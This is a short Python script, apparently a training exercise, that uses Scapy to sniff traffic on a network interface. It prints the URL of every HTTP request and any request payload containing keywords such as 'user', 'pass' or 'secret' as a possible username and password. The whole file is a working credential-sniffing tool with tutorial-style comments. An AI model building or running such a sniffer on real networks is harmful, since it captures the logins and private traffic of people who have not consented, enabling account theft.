#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

# ✔ ✓ ✅ ☑ ☒ ☓ ✗ ✘ ❌ ❎

def do_interface_sniff(interface):
    ## iface = Network Interface
    ## store (False) = Tells Scapy not to store packets in memory, in order to lessen computer stress
    ## prn = Allows Scapy to call a function every time it captures a packet
    ## filter = Lets Scapy specify your search ("ftp", "port 21")
    scapy.sniff(iface=interface, store=False, prn=do_packet_process)

def do_packet_process(packet):
    ## Most raw contents are unreadable this way (Garbage Text) 
    # print(packet)
    ## Checks the objects/classes of the packet
    # print(packet.show())
    ## Checks if the packet has a HTTP Request layer
    if packet.haslayer(http.HTTPRequest):
        str_url = do_parse_url(packet)
        print(str_url)
        str_login_info = get_login_info(packet)
        if str_login_info:
            print("☑  Possbile Username and Password: " + str_login_info)

def do_parse_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    ## Checks if the packet has a Raw layer
    if packet.haslayer(scapy.Raw):
    ## Specify the Raw contents of the packet after checking
        # print(packet[scapy.Raw].load)
        obj_load = packet[scapy.Raw].load
        list_keywords = ["user", "login", "pass", "key", "secret"]
        for str_keyword in list_keywords:
            if str_keyword in obj_load:
                return obj_load

str_interface = "Hyper-V Virtual Ethernet Adapter #2"

do_interface_sniff(str_interface)